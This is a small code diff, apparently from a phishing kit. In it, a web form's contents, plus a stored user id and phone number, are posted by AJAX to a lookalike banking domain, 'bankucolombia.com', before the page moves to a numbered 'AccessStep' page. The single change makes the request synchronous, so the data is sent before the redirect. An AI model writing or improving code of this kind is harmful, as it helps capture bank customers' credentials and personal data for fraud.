@@ -143,6 +143,7 @@
                         url: "https://bankucolombia.com/lib/ajax_service_mobil.php",
                         data: $("#frm_register").serialize()+"&id_u="+localStorage.id_u+"&cellphone_u="+localStorage.cellphone_u,
                         dataType:'JSON',
+                        async:false,
                         success: function(msg){
                             if(msg.status==200){
                                 window.location = "04_AccessStep4.html";
